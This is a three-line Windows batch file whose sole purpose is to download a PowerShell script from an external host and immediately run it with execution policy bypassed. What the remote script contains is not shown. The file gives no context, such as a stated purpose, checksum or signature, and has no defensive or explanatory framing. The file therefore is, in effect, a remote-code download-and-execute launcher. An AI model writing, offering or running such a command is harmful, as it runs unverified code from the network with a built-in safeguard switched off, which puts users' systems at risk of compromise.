@echo off
powershell -Command "& {Invoke-WebRequest -Uri 'https://25.plrp.cz/script.ps1' -OutFile 'script.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -NoProfile -File script.ps1'}"
PAUSE
